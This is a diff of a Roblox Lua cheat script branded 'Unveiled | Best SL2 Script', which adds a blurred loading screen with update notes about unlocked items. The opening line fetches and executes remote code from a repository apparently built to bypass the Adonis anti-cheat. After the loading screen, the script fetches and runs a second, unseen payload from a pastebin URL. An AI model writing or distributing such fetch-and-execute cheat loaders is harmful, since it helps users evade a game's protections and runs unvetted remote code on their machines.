@@ -1,56 +1,133 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
 
-task.wait(5)
+task.wait(15)
 
 script.Parent = game.StarterPlayer.StarterPlayerScripts
 
 task.wait(1)
 
-local Players = game:GetService("Players")
+local player = game.Players.LocalPlayer
+local playerGui = player:FindFirstChild("PlayerGui")
 
-local function createGuiForPlayer(player)
-    local playerGui = player:WaitForChild("PlayerGui")
-    
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "TransformedGui"
-    screenGui.Parent = playerGui
-    
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0.5, 0, 0.5, 0)
-    frame.Position = UDim2.new(0.25, 0, 0.25, 0)
-    frame.Parent = screenGui
-    
-    local loadingFrame = Instance.new("Frame")
-    loadingFrame.Size = UDim2.new(1, 0, 0.2, 0)
-    loadingFrame.Position = UDim2.new(0, 0, 0, 0)
-    loadingFrame.Parent = frame
-    
-    local uiCorner = Instance.new("UICorner")
-    uiCorner.Parent = loadingFrame
-    
-    local descFrame = Instance.new("ScrollingFrame")
-    descFrame.Size = UDim2.new(1, 0, 0.8, 0)
-    descFrame.Position = UDim2.new(0, 0, 0.2, 0)
-    descFrame.Parent = frame
-    
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 0.5, 0)
-    textLabel.Position = UDim2.new(0, 0, 0, 0)
-    textLabel.Text = "Description"
-    textLabel.Parent = descFrame
-    
-    local textLabel1 = Instance.new("TextLabel")
-    textLabel1.Size = UDim2.new(1, 0, 0.5, 0)
-    textLabel1.Position = UDim2.new(0, 0, 0.5, 0)
-    textLabel1.Text = "More Info"
-    textLabel1.Parent = descFrame
+if not playerGui then return end  -- Safety check
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = playerGui
+screenGui.Name = "LoadingScreen"
+
+-- Create blur effect
+local blurEffect = Instance.new("BlurEffect")
+blurEffect.Size = 25
+blurEffect.Parent = game.Lighting
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 250)  -- Increased height to fit all text
+frame.Position = UDim2.new(0.5, -200, 0.5, -125)
+frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+frame.BackgroundTransparency = 0.4
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+
+-- UI Stroke (Subtle Border)
+local frameStroke = Instance.new("UIStroke")
+frameStroke.Color = Color3.fromRGB(255, 255, 255)
+frameStroke.Thickness = 1.5
+frameStroke.Transparency = 0.7
+frameStroke.Parent = frame
+
+-- Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Text = "🔑 Unveiled | Best SL2 Script"
+titleLabel.Size = UDim2.new(1, 0, 0, 40)
+titleLabel.Position = UDim2.new(0, 0, 0, 10)
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamSemibold
+titleLabel.TextSize = 28
+titleLabel.TextStrokeTransparency = 0.8
+titleLabel.Parent = frame
+
+-- Update Section
+local bulletinsFrame = Instance.new("Frame")
+bulletinsFrame.Size = UDim2.new(1, -20, 0, 90)  -- Adjusted height to fit all text
+bulletinsFrame.Position = UDim2.new(0, 10, 0, 50)
+bulletinsFrame.BackgroundTransparency = 1
+bulletinsFrame.Parent = frame
+
+-- Update Title
+local updateTitleLabel = Instance.new("TextLabel")
+updateTitleLabel.Text = "🔄 UPDATE v2.4"
+updateTitleLabel.Size = UDim2.new(1, 0, 0, 20)
+updateTitleLabel.Position = UDim2.new(0, 0, 0, 0)
+updateTitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+updateTitleLabel.BackgroundTransparency = 1
+updateTitleLabel.Font = Enum.Font.GothamBold
+updateTitleLabel.TextSize = 22
+updateTitleLabel.TextStrokeTransparency = 0.8
+updateTitleLabel.Parent = bulletinsFrame
+
+-- Update Details (Fixed Text Not Showing)
+local bulletPointsLabel = Instance.new("TextLabel")
+bulletPointsLabel.Text = [[
+⚙️ Whole new ui make over 🎉
+✅ Fixed script not showing bug 👾
+🔥 Auto skittles added
+👀 Free chains unlocked
+🚀 More updates coming soon!]]
+bulletPointsLabel.Size = UDim2.new(1, 0, 1, -20)
+bulletPointsLabel.Position = UDim2.new(0, 0, 0, 20)
+bulletPointsLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+bulletPointsLabel.BackgroundTransparency = 1
+bulletPointsLabel.Font = Enum.Font.Gotham
+bulletPointsLabel.TextSize = 16  -- Slightly smaller to fit all text
+bulletPointsLabel.TextWrapped = true  -- Ensures all text is visible
+bulletPointsLabel.TextYAlignment = Enum.TextYAlignment.Top
+bulletPointsLabel.Parent = bulletinsFrame
+
+-- Progress Bar Frame
+local progressBarFrame = Instance.new("Frame")
+progressBarFrame.Size = UDim2.new(0, 380, 0, 20)
+progressBarFrame.Position = UDim2.new(0, 10, 0, 200)  -- Adjusted position
+progressBarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+progressBarFrame.Parent = frame
+
+local progressBarFrameCorner = Instance.new("UICorner")
+progressBarFrameCorner.CornerRadius = UDim.new(0, 10)
+progressBarFrameCorner.Parent = progressBarFrame
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+progressBar.Parent = progressBarFrame
+
+local progressBarCorner = Instance.new("UICorner")
+progressBarCorner.CornerRadius = UDim.new(0, 10)
+progressBarCorner.Parent = progressBar
+
+-- Animate Progress Bar
+local TweenService = game:GetService("TweenService")
+local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+
+local progressTween = TweenService:Create(progressBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+progressTween:Play()
+
+-- Improved Async Removal of Loading Screen
+local function removeLoadingScreenAsync()
+    spawn(function()  -- Run asynchronously to avoid blocking the main thread
+        wait(7)  -- Wait before removing
+        blurEffect:Destroy()
+        screenGui:Destroy()
+        
+        -- Load Main Script
+        loadstring(game:HttpGet("https://pastebin.com/raw/2wRVPBpY"))()
+    end)
 end
 
-Players.PlayerAdded:Connect(createGuiForPlayer)
-
-for _, player in Players:GetPlayers() do
-    createGuiForPlayer(player)
-end
+removeLoadingScreenAsync()  -- Call the function asynchronously
 
 
 
